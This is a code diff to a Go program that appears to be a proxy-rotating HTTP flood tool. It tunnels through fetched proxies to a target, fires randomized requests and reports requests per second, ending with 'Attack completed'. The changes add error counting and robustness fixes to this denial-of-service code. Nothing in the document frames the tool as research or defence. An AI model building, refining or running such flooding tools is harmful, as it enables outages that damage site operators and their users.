@@ -1,5 +1,5 @@
 package main
-// r
+
 import (
     "crypto/tls"
     "flag"
@@ -26,6 +26,7 @@ var (
     proxies      []string
     requestCount uint64
     peakRPS      uint64
+    errorCount   uint64
 
     acceptList = []string{
         "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8",
@@ -141,21 +142,23 @@ func fetchProxies() {
 func sendRequest(proxyAddr, target string) {
     parsedURL, err := url.Parse(target)
     if err != nil {
-        log.Println("Invalid target URL:", err)
+        atomic.AddUint64(&errorCount, 1)
         return
     }
 
     dialer := &net.Dialer{Timeout: 3 * time.Second, KeepAlive: 30 * time.Second}
     conn, err := dialer.Dial("tcp", proxyAddr)
     if err != nil {
+        atomic.AddUint64(&errorCount, 1)
         return
     }
     defer conn.Close()
 
     fmt.Fprintf(conn, "CONNECT %s:443 HTTP/1.1\r\nHost: %s\r\nProxy-Connection: Keep-Alive\r\nConnection: Keep-Alive\r\n\r\n", parsedURL.Host, parsedURL.Host)
     buf := make([]byte, 4096)
-    _, err = conn.Read(buf)
-    if err != nil || !strings.Contains(string(buf), "200") {
+    n, err := conn.Read(buf)
+    if err != nil || !strings.Contains(string(buf[:n]), "200") {
+        atomic.AddUint64(&errorCount, 1)
         return
     }
 
@@ -189,6 +192,7 @@ func sendRequest(proxyAddr, target string) {
             path := randomPath()
             req, err := http.NewRequest(method, target+path, nil)
             if err != nil {
+                atomic.AddUint64(&errorCount, 1)
                 return
             }
             for k, v := range headers {
@@ -196,9 +200,11 @@ func sendRequest(proxyAddr, target string) {
             }
             atomic.AddUint64(&requestCount, 1)
             resp, err := client.Do(req)
-            if err == nil {
-                resp.Body.Close()
+            if err != nil {
+                atomic.AddUint64(&errorCount, 1)
+                return
             }
+            resp.Body.Close()
         }()
     }
     wg.Wait()
@@ -230,21 +236,25 @@ func monitorStats(startTime time.Time, stopChan chan struct{}) {
             return
         case <-ticker.C:
             current := atomic.LoadUint64(&requestCount)
+            errors := atomic.LoadUint64(&errorCount)
             elapsed := time.Since(startTime).Seconds()
             rps := current - lastCount
             if rps > peakRPS {
                 atomic.StoreUint64(&peakRPS, rps)
             }
-            avgRPS := float64(current) / elapsed
+            avgRPS := float64(0)
+            if elapsed > 0 {
+                avgRPS = float64(current) / elapsed
+            }
 
-            // Clear previous output and print all stats
-            fmt.Print("\033[2J\033[1;1H") // ANSI escape codes to clear screen and move cursor to top
+            fmt.Print("\033[2J\033[1;1H")
             fmt.Printf("Target: %s\n", targetURL)
             fmt.Printf("Time: %.0f/%d seconds\n", elapsed, duration)
             fmt.Printf("Total Requests: %d\n", current)
             fmt.Printf("Current RPS: %d\n", rps)
             fmt.Printf("Peak RPS: %d\n", peakRPS)
             fmt.Printf("Average RPS: %.2f\n", avgRPS)
+            fmt.Printf("Errors: %d\n", errors)
 
             lastCount = current
         }
@@ -271,12 +281,15 @@ func main() {
     close(stopChan)
     wg.Wait()
 
-    // Final stats
     total := atomic.LoadUint64(&requestCount)
+    errors := atomic.LoadUint64(&errorCount)
     elapsed := time.Since(startTime).Seconds()
-    avgRPS := float64(total) / elapsed
+    avgRPS := float64(0)
+    if elapsed > 0 {
+        avgRPS = float64(total) / elapsed
+    }
 
-    fmt.Print("\033[2J\033[1;1H") // Clear screen for final output
+    fmt.Print("\033[2J\033[1;1H")
     fmt.Println("Attack completed")
     fmt.Printf("Target: %s\n", targetURL)
     fmt.Printf("Time: %.0f/%d seconds\n", elapsed, duration)
@@ -284,4 +297,5 @@ func main() {
     fmt.Printf("Current RPS: 0\n")
     fmt.Printf("Peak RPS: %d\n", peakRPS)
     fmt.Printf("Average RPS: %.2f\n", avgRPS)
+    fmt.Printf("Errors: %d\n", errors)
 }
